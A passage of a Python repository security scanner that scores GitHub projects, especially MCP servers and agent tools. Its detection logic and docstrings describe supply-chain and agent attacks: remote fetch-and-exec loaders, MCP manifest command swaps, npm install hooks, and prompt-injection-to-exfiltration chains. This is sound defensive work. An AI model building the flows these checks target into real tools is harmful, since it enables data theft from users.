                    effective_severity = "medium"
                findings.append(Finding(
                    category="prompt_injection",
                    name=name,
                    severity=effective_severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

        # Check code obfuscation
        for name, pattern, severity in OBFUSCATION_PATTERNS:
            if pattern.search(line):
                if _is_allowlisted(file_path, name, allowlist):
                    continue
                findings.append(Finding(
                    category="obfuscation",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                ))
                break

    # Split fetch->exec across lines: a network read + an exec sink co-occurring in
    # one file is the classic rug-pull loader the per-line scan can't see. Fire only
    # when they're within ~40 lines of each other (keeps the composite finding tight).
    if not is_downgraded and NET_READ_RE.search(content) and EXEC_SINK_RE.search(content):
        net_lines = [i for i, ln in enumerate(lines) if NET_READ_RE.search(ln)]
        exec_lines = [i for i, ln in enumerate(lines) if EXEC_SINK_RE.search(ln)]
        if net_lines and exec_lines and any(
            abs(n - e) <= 40 for n in net_lines for e in exec_lines
        ):
            findings.append(Finding(
                category="dynamic_remote_load",
                name="Remote fetch + dynamic exec in same file (possible rug-pull)",
                severity="high",
                file_path=file_path,
                line_number=min(net_lines) + 1,
                snippet="network read + exec sink co-occur — remote payload may be swappable",
            ))

    # Manifest command/args rug-pull (#4, MCPoison) — structural, not per-line
    if is_metadata and Path(file_path).name.lower().endswith(".json"):
        findings.extend(_scan_manifest_exec(content, file_path))

    # Toxic-flow / lethal-trifecta composition (#9) — whole-file capability co-occurrence
    findings.extend(_composite_findings(content, file_path, lines, is_downgraded, allowlist))

    # Add remediation hints to all findings
    for f in findings:
        if not f.remediation:
            f.remediation = _REMEDIATION_HINTS.get(f.category, "Review and address this finding")

    # Check positive signals per-line, skipping comments and examples
    # (same filtering as negative patterns to prevent comment-trick gaming)
    for line in lines:
        stripped_pos = line.strip()
        if not stripped_pos:
            continue
        if stripped_pos.startswith(("#", "//", "*", "/*")):
            continue
        if "example" in stripped_pos.lower() or "placeholder" in stripped_pos.lower():
            continue
        for name, pattern in AUTH_POSITIVE_PATTERNS:
            if pattern.search(stripped_pos):
                positives.append(name)

    return findings, positives, suppressed_count


def _scan_dependencies(content: str, file_path: str) -> list[Finding]:
    """Scan dependency files for known vulnerable package versions.

    Parses requirements.txt, pyproject.toml, package.json, etc. and checks
    against a curated list of packages with known critical CVEs.
    """
    findings: list[Finding] = []
    filename = Path(file_path).name.lower()

    if filename not in {f.lower() for f in _DEP_FILES}:
        return findings

    for pkg_name, vuln_pattern, severity, description in _VULN_DEPS:
        # Search the entire file content for vulnerable version patterns
        for line_num, line in enumerate(content.split("\n"), 1):
            stripped = line.strip()
            # Skip comments
            if stripped.startswith(("#", "//", "*")):
                continue
            if vuln_pattern.search(stripped):
                findings.append(Finding(
                    category="dependency",
                    name=f"Vulnerable dependency: {pkg_name}",
                    severity=severity,
                    file_path=file_path,
                    line_number=line_num,
                    snippet=stripped[:120],
                    remediation=description,
                ))
                break  # one finding per package per file

    # --- Install-script analysis (#5) — npm lifecycle hooks run on `npm install` ---
    if filename == "package.json":
        findings.extend(_scan_install_hooks(content, file_path))

    return findings


def _iter_command_specs(node):
    """Yield every {command, args} object nested anywhere in a parsed manifest."""
    if isinstance(node, dict):
        if isinstance(node.get("command"), str):
            args = node.get("args")
            args_str = " ".join(str(a) for a in args) if isinstance(args, list) else ""
            yield f"{node['command']} {args_str}".strip()
        for value in node.values():
            yield from _iter_command_specs(value)
    elif isinstance(node, list):
        for value in node:
            yield from _iter_command_specs(value)


def _scan_manifest_exec(content: str, file_path: str) -> list[Finding]:
    """#4 — inspect an MCP manifest's command/args for rug-pull exec (CVE-2025-54136).

    A mutable mcp.json/server.json whose command launches an inline interpreter-eval or
    pipes a remote fetch to a shell is the MCPoison vector: the client re-reads the file,
    so a swapped command runs on re-launch. Structural (parses JSON), not line-by-line.
    """
    findings: list[Finding] = []
    try:
        data = json.loads(content)
    except (ValueError, TypeError):
        return findings
    seen: set[tuple[str, str]] = set()
    for command_line in _iter_command_specs(data):
        for name, pattern, severity in MANIFEST_EXEC_PATTERNS:
            if pattern.search(command_line):
                if (name, command_line) in seen:
                    continue
                seen.add((name, command_line))
                findings.append(Finding(
                    category="dynamic_remote_load",
                    name=name,
                    severity=severity,
                    file_path=file_path,
                    line_number=1,
                    snippet=command_line[:120],
                ))
                break  # one finding per command spec
    return findings


def _scan_install_hooks(content: str, file_path: str) -> list[Finding]:
    """#5 — flag npm pre/post/install lifecycle scripts (a top supply-chain vector).

    These run automatically on `npm install`. Presence alone is a medium signal; a hook
    that fetches/pipes-to-shell/evals is escalated to critical.
    """
    findings: list[Finding] = []
    try:
        data = json.loads(content)
    except (ValueError, TypeError):
        return findings
    scripts = data.get("scripts") if isinstance(data, dict) else None
    if not isinstance(scripts, dict):
        return findings
    for hook in NPM_INSTALL_HOOKS:
        cmd = scripts.get(hook)
        if not isinstance(cmd, str) or not cmd.strip():
            continue
        if INSTALL_SCRIPT_DANGER_RE.search(cmd):
            severity, label = "critical", "runs remote/shell/eval content"
        else:
            severity, label = "medium", "auto-runs on install"
        findings.append(Finding(
            category="install_hook",
            name=f"npm '{hook}' lifecycle script ({label})",
            severity=severity,
            file_path=file_path,
            line_number=1,
            snippet=f"{hook}: {cmd}"[:120],
            remediation=_REMEDIATION_HINTS["install_hook"],
        ))
    return findings


def _canonical_tool_digest(content: str, file_path: str) -> str | None:
    """#8 — canonical sha256 of an agent/tool definition file, for drift-pinning.

    Returns None for non-metadata files. JSON manifests (mcp.json/server.json/
    ai-plugin.json) are canonicalized (sorted keys, no whitespace) so reformatting
    is NOT drift — only a semantic change to the tool definition is. Markdown/text
    (SKILL.md, agents.md) is line-normalized (strip trailing ws, collapse blank ends).
    """
    name = Path(file_path).name.lower()
    if name not in AGENT_METADATA_FILES:
        return None
    if name.endswith(".json"):
        try:
            obj = json.loads(content)
            canon = json.dumps(
                obj, sort_keys=True, separators=(",", ":"), ensure_ascii=False,
            )
        except (ValueError, TypeError):
            canon = "\n".join(ln.rstrip() for ln in content.splitlines())
    else:
        canon = "\n".join(ln.rstrip() for ln in content.splitlines()).strip("\n")
    return "sha256:" + hashlib.sha256(canon.encode("utf-8")).hexdigest()


def _compute_manifest_digest(tool_digests: dict[str, str]) -> str | None:
    """Combine per-file tool digests into one manifest digest for the attestation."""
    if not tool_digests:
        return None
    joined = "\n".join(f"{p}={tool_digests[p]}" for p in sorted(tool_digests))
    return "sha256:" + hashlib.sha256(joined.encode("utf-8")).hexdigest()


def _composite_findings(
    content: str,
    file_path: str,
    lines: list[str],
    is_test_or_doc: bool,
    allowlist: object,
) -> list[Finding]:
    """#9 — the lethal trifecta: private-data read + untrusted input + outbound send.

    Each capability is benign alone; together in one tool they form the prompt-injection
    → exfiltration chain (Willison's "lethal trifecta"; the Invariant GitHub-MCP exploit).
    We require ALL THREE legs present to keep precision high — a pure API wrapper that
    reads an env key and posts to one endpoint, with no untrusted-content ingestion,
    does NOT trigger. Emits at most one finding per file.
    """
    # Cheap pre-check on the whole blob before the per-line pass
    if not (
        UNTRUSTED_INPUT_RE.search(content)
        and OUTBOUND_SEND_RE.search(content)
        and (SENSITIVE_READ_RE.search(content) or FILE_READ_RE.search(content))
    ):
        return []

    def _hits(rx: re.Pattern[str]) -> list[int]:
        out = []
        for i, ln in enumerate(lines):
            stripped = ln.strip()
            if not stripped or stripped.startswith(("#", "//", "*", "/*")):
                continue
            if rx.search(ln):
                out.append(i + 1)
        return out

    untrusted = _hits(UNTRUSTED_INPUT_RE)
    outbound = _hits(OUTBOUND_SEND_RE)
    sensitive = _hits(SENSITIVE_READ_RE)
    file_read = _hits(FILE_READ_RE)
    if not (untrusted and outbound and (sensitive or file_read)):
        return []

    if sensitive:
        name = "Lethal trifecta: private-data read + untrusted input + outbound network"
        severity = "high"
        line = sensitive[0]
    else:
        name = "Toxic flow: file read + untrusted input + outbound network"
        severity = "medium"
        line = file_read[0]

    if _is_allowlisted(file_path, name, allowlist):
        return []
    if is_test_or_doc and severity in ("critical", "high"):
        severity = "medium"

    return [Finding(
        category="toxic_flow",
        name=name,
        severity=severity,
        file_path=file_path,
        line_number=line,
        snippet="capability composition — each part benign alone, dangerous together",
    )]


def _calculate_trust_score(result: ScanResult) -> int:
    """Calculate a trust score (0-100) based on findings and signals.

    Score considers:
    - Finding counts by severity (deductions)
    - Positive security signals (bonuses)
    - Good practices: README, LICENSE, tests (bonuses)
    - File ratio: if findings are concentrated in few files, reduce penalty
    """
    # Clean repos start higher — no findings means the code passed review
    total_findings = result.critical_count + result.high_count + result.medium_count
    score = 80 if total_findings == 0 else 70

    # For MCP servers and media/audio tools, discount expected patterns
    # These are intentional capabilities, not vulnerabilities
    if result.is_mcp_server or result.is_media_tool:
        expected_categories = (
            {"fs_access", "unsafe_exec"} if result.is_mcp_server else {"fs_access"}
        )
        actual_critical = sum(
            1 for f in result.findings
            if f.severity == "critical" and f.category not in expected_categories
        )
        actual_high = sum(
            1 for f in result.findings
            if f.severity == "high" and f.category not in expected_categories
        )
        actual_medium = sum(
            1 for f in result.findings
            if f.severity == "medium" and f.category not in expected_categories
        )
        # Count expected patterns at 10% weight (not zero — they still matter)
        expected_medium = result.medium_count - actual_medium
        expected_high = result.high_count - actual_high
        raw_deduction = (
            actual_critical * 15
            + actual_high * 8
            + actual_medium * 3
            + int(expected_high * 0.8)  # 10% of normal penalty
            + int(expected_medium * 0.3)
        )
    else:
        # Standard deductions for non-MCP repos
        raw_deduction = (
            result.critical_count * 15
            + result.high_count * 8
            + result.medium_count * 3
        )

    # File-ratio scaling: if only a small percentage of files have issues,
    # reduce the deduction. A repo with 200 files and 5 findings in 3 files
    # should not be penalized as harshly as one with findings in 50% of files.
    if result.files_scanned > 0 and total_findings > 0:
        affected_files = len({f.file_path for f in result.findings})
        ratio = affected_files / result.files_scanned
        # Scale factor: 0.4 at 1% affected, 1.0 at 25%+ affected
        scale = min(1.0, 0.4 + ratio * 2.4)
        raw_deduction = int(raw_deduction * scale)

    score -= raw_deduction

    # Bonuses for positive signals (capped at +35)
    unique_positives = set(result.positive_signals)
    score += min(len(unique_positives) * 5, 35)

    # Bonuses for good practices
    if result.has_readme:
        score += 5
    if result.has_license:
        score += 5
    if result.has_tests:
        score += 5

    # Penalty for inline suppression (gaming deterrent)
    # First 3 are free (legitimate false-positive suppression).
    # After that, -3 per suppression — even moderate suppression is suspicious.
    # Rationale: hiding a critical saves 15pts but costs 3pts — still net positive
    # for the attacker, but much less favorable than the old 10-free / -2 scheme.
    if result.suppressed_count > 3:
        excess = result.suppressed_count - 3
        score -= excess * 3

    return max(0, min(100, score))


def _calculate_category_scores(result: ScanResult) -> dict[str, int]:
    """Calculate per-category sub-scores (0-100) as independent axes.

    Categories: secret_hygiene, code_safety, data_handling, filesystem_access.
    Each starts at 100 and deducts based on severity-weighted findings.
    """
    # Map finding categories to score categories
    category_map = {
        "secret": "secret_hygiene",
        "unsafe_exec": "code_safety",
        "obfuscation": "code_safety",
        "dynamic_remote_load": "code_safety",
        "hidden_unicode": "code_safety",
        "prompt_injection": "code_safety",
        "insecure_deserialization": "code_safety",
        "exfiltration": "data_handling",
        "toxic_flow": "data_handling",
        "fs_access": "filesystem_access",
        "dependency": "dependency_health",
        "install_hook": "dependency_health",
    }
    severity_weights = {"critical": 25, "high": 15, "medium": 8, "low": 3}

    scores: dict[str, int] = {
        "secret_hygiene": 100,
        "code_safety": 100,
        "data_handling": 100,
        "filesystem_access": 100,
        "dependency_health": 100,
    }

    # For MCP servers and media/audio tools, expected patterns get discounted
    expected_mcp_categories = {"unsafe_exec", "fs_access"} if result.is_mcp_server else set()
    # Media/TTS/audio tools legitimately read/write files
    if result.is_media_tool:
        expected_mcp_categories.add("fs_access")

    for finding in result.findings:
        score_cat = category_map.get(finding.category)
        if score_cat:
            deduction = severity_weights.get(finding.severity, 3)
            # Discount expected MCP patterns to 10% of normal penalty
            if finding.category in expected_mcp_categories and finding.severity != "critical":
                deduction = max(1, deduction // 10)
            scores[score_cat] = max(0, scores[score_cat] - deduction)

    return scores


async def scan_repo(
    full_name: str,
    stars: int = 0,
    description: str = "",
    framework: str = "",
    token: str | None = None,
) -> ScanResult:
    """Scan a single GitHub repo for security issues.

    Args:
        full_name: "owner/repo" format
        stars: star count (for metadata)
        description: repo description
        framework: detected framework
        token: GitHub API token (optional but recommended for rate limits)

    Returns:
        ScanResult with findings and trust score
    """
    result = ScanResult(
        repo=full_name,
        stars=stars,
        description=description,
        framework=framework,
    )

    parts = full_name.split("/")
    if len(parts) != 2:
        result.error = f"Invalid repo name: {full_name}"
        return result

    owner, repo = parts

    try:
        # Fetch file tree
        tree = await _fetch_repo_tree(owner, repo, token)
        if not tree:
            result.error = "Could not fetch repo tree (may be empty or private)"
            return result

        result.primary_language = _detect_language(tree)

        # Check for README, LICENSE, tests
        for item in tree:
            path_lower = item["path"].lower()
            if path_lower.startswith("readme"):
                result.has_readme = True
            if path_lower.startswith("license") or path_lower.startswith("licence"):
                result.has_license = True
            if "test" in path_lower or "spec" in path_lower:
                result.has_tests = True

        # Detect MCP server context — MCP servers have expected tool patterns
        # (fs_access, subprocess) that shouldn't be penalized as heavily
        mcp_indicators = {"server.json", "mcp.json", ".mcp.json"}
        mcp_dep_files = {"package.json", "pyproject.toml", "setup.py"}
        for item in tree:
            fname = Path(item["path"]).name.lower()
            if fname in mcp_indicators:
                result.is_mcp_server = True
                break
        if not result.is_mcp_server:
            # Check if package.json or pyproject.toml mentions MCP
            for item in tree:
                if Path(item["path"]).name.lower() in mcp_dep_files:
                    content = await _fetch_file_content(owner, repo, item["path"], token)
                    low = (content or "").lower()
                    mcp_match = "mcp" in low or "modelcontextprotocol" in low
                    if mcp_match or "model-context-protocol" in low:
                        result.is_mcp_server = True
                        break

        # Detect audio/TTS/media tools — filesystem access is expected
        if not result.is_media_tool:
            media_keywords = {
                "tts", "text-to-speech", "speech", "audio", "voice",
                "whisper", "synthesize", "synthesizer", "vocoder",
                "video", "ffmpeg", "media", "sound", "wav", "mp3",
                "transcribe", "transcription",
            }
            # Check repo name and description
            repo_lower = full_name.lower()
            desc_lower = description.lower()
            if any(kw in repo_lower or kw in desc_lower for kw in media_keywords):
                result.is_media_tool = True
            # Check file patterns in tree
            if not result.is_media_tool:
                media_file_patterns = {
                    ".wav", ".mp3", ".ogg", ".flac", ".m4a",
                    ".mp4", ".avi", ".mkv", ".webm",
                    "audio", "voice", "tts", "speech",
                }
                media_file_count = sum(
                    1 for item in tree
                    if any(p in item["path"].lower() for p in media_file_patterns)
                )
                if media_file_count >= 3:
                    result.is_media_tool = True

        # Check for dependency pinning (lock files) in tree
        lock_files = {"requirements.txt", "poetry.lock", "package-lock.json",
                      "pipfile.lock", "cargo.lock", "yarn.lock", "pnpm-lock.yaml"}
        for item in tree:
            if Path(item["path"]).name.lower() in lock_files:
                result.positive_signals.append("Dependency pinning")
                break

        # Load .agentgraph-scan.yml config if present
        user_excludes: set[str] = set()
        for item in tree:
            if item["path"] in (".agentgraph-scan.yml", ".agentgraph-scan.yaml"):
                cfg_content = await _fetch_file_content(owner, repo, item["path"], token)
                if cfg_content:
                    try:
                        import yaml  # noqa: E402
                        cfg = yaml.safe_load(cfg_content) or {}
                        for pattern in cfg.get("exclude", []):
                            user_excludes.add(str(pattern).lower())
                    except Exception:
                        pass
                break

        # Filter to scannable files (respecting user excludes)
        def _user_excluded(path: str) -> bool:
            low = path.lower()
            return any(exc in low for exc in user_excludes)

        scannable_files = [
            item for item in tree
            if not _should_skip_path(item["path"])
            and _is_source_file(item["path"])
            and not _user_excluded(item["path"])
        ]
        # Coverage disclosure (#4): record the full scannable count BEFORE truncation,
        # and flag when the signed grade is only a sample of the repo.
        result.total_scannable_files = len(scannable_files)
        result.sampled = result.total_scannable_files > _MAX_FILES_PER_REPO
        scan_files = scannable_files[:_MAX_FILES_PER_REPO]

        # Load allowlist once for the whole scan
        allowlist = _load_allowlist()

        # Scan files in parallel batches (10 concurrent fetches)
        import asyncio

        scan_concurrency = 10
        per_file_timeout = 15.0  # seconds per file fetch
        sem = asyncio.Semaphore(scan_concurrency)

        async def _scan_one(item: dict) -> tuple:
            """Fetch and scan a file.

            Returns (findings, positives, suppressed, digest, scanned). ``scanned`` is
            True only when the file was actually fetched AND scanned — a failed fetch or
            empty file returns False so it does NOT inflate ``files_scanned`` (#7).
            """
            path = item["path"]
            try:
                async with sem:
                    content = await asyncio.wait_for(
                        _fetch_file_content(owner, repo, path, token),
                        timeout=per_file_timeout,
                    )
                if not content:
                    return [], [], 0, None, False
                f, p, s = _scan_content(content, path, allowlist)
                return f, p, s, (path, _canonical_tool_digest(content, path)), True
            except (asyncio.TimeoutError, Exception):
                return [], [], 0, None, False

        tasks = [_scan_one(item) for item in scan_files]
        scan_results = await asyncio.gather(*tasks)

        for findings_list, positives_list, suppressed, digest, scanned in scan_results:
            # Only count files that were actually scanned (#7) — signed filesScanned
            # must reflect real coverage, not attempted fetches.
            if scanned:
                result.files_scanned += 1
            result.findings.extend(findings_list)
            result.positive_signals.extend(positives_list)
            result.suppressed_count += suppressed
            if digest and digest[1]:
                result.tool_digests[digest[0]] = digest[1]

        result.tool_manifest_digest = _compute_manifest_digest(result.tool_digests)

        # --- Dependency vulnerability scanning ---
        dep_file_names = {f.lower() for f in _DEP_FILES}
        dep_files = [
            item for item in tree
            if Path(item["path"]).name.lower() in dep_file_names
            and not _should_skip_path(item["path"])
        ]
        for dep_item in dep_files[:10]:  # cap at 10 dep files
            try:
                async with sem:
                    dep_content = await asyncio.wait_for(
                        _fetch_file_content(
                            owner, repo, dep_item["path"], token,
                        ),
                        timeout=per_file_timeout,
                    )
                if dep_content:
                    dep_findings = _scan_dependencies(
                        dep_content, dep_item["path"],
                    )
                    result.findings.extend(dep_findings)
            except (asyncio.TimeoutError, Exception):
                pass

        # Calculate trust score and per-category sub-scores
        result.trust_score = _calculate_trust_score(result)
        result.category_scores = _calculate_category_scores(result)

    except httpx.TimeoutException:
        result.error = "Request timed out"
    except Exception as exc:
        result.error = str(exc)
        logger.exception("Error scanning %s", full_name)

    return result
